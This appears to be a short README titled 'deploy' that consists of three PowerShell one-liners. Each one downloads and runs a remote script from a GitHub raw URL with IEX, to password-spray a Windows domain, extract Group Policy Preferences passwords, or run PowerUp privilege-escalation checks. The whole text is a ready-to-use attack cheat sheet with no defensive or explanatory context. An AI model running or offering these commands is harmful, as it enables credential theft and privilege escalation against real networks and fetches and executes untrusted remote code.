# deploy

IEX (New-Object Net.WebClient).DownloadString('https://raw.githubusercontent.com/launchsilo/deploy/main/DomainSpray.ps1') ; Invoke-DomainPasswordSpray -Password Password!1

IEX (New-Object Net.WebClient).DownloadString('https://raw.githubusercontent.com/launchsilo/deploy/main/Get-GPPPassword.ps1') ; Get-GPPPassword | ForEach-Object {$_.passwords} | Sort-Object -Uniq#

IEX (New-Object net.WebClient).downloadstring("https://raw.githubusercontent.com/launchsilo/deploy/main/PowerUp.ps1") ; Invoke-AllChecks
